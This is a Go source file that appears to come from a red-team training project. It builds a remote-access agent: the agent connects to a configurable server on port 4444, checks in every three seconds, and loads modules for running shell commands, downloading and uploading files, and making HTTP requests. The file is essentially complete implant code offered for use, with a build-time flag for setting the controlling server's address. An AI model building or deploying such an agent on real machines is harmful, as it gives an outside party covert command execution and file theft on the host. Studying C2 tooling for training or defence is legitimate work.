package main

import (
	"log"

	"github.com/1stl0ve/avengercon/pkg/agent"
	"github.com/1stl0ve/avengercon/pkg/module/exec"
	"github.com/1stl0ve/avengercon/pkg/module/file"
	"github.com/1stl0ve/avengercon/pkg/module/http"
)

// the server address can be modified at buildtime by using including the
// following in the build command: -ldflags "-X main.serverAddr=W.X.Y.Z"
var serverAddr = "127.0.0.1"

func main() {
	var err error

	// create a new Agent instance
	agent, err := agent.New(agent.Config{
		Host:           serverAddr,
		Port:           4444,
		FetchFrequency: "3s",
	})
	if err != nil {
		log.Fatal(err)
	}

	// add the modules that we want
	agent.AddModule("cmd", &exec.Agent{})
	agent.AddModule("download", &file.Agent{})
	agent.AddModule("upload", &file.Agent{})
	agent.AddModule("http", &http.Agent{})

	// start the agent!
	if err := agent.Run(); err != nil {
		log.Fatal(err)
	}
}
